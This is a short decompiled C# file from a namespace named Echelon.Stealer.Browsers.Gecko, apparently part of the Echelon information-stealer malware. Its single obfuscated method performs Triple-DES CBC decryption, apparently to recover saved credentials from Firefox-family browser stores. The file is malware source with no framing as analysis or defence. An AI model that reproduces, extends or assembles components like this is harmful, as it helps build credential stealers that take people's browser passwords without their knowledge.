using System;
using System.Security.Cryptography;
using System.Text;

namespace Echelon.Stealer.Browsers.Gecko
{
	// Token: 0x02000038 RID: 56
	public static class Gecko6
	{
		// Token: 0x0600015C RID: 348 RVA: 0x0000B0C4 File Offset: 0x000092C4
		public static string lTRjlt(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
		{
			string @string;
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = paddingMode;
				using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, iv))
				{
					@string = Encoding.Default.GetString(cryptoTransform.TransformFinalBlock(input, 0, input.Length));
				}
			}
			return @string;
		}
	}
}
